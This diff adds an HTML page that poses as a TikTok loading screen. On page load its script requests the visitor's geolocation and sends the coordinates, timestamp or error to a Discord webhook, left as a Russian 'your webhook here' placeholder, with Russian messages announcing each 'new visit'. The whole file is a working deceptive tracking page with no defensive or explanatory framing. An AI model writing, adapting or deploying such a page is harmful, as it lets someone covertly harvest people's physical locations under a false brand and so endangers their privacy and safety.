@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>TikTok</title>
+</head>
+<body>
+  <h1>Loading TikTok...</h1>
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/ВАШ_WEBHOOK_ТУТ';
+
+    function sendToDiscord(content) {
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ content })
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const message = `🌍 Новое посещение!\nКоординаты: ${lat}, ${lon}\nВремя: ${new Date().toLocaleString()}`;
+          sendToDiscord(message);
+        }, error => {
+          sendToDiscord(`⛔ Ошибка получения геолокации: ${error.message}`);
+        });
+      } else {
+        sendToDiscord('⚠️ Браузер не поддерживает геолокацию');
+      }
+    }
+
+    getLocation();
+  </script>
+</body>
+</html>
+
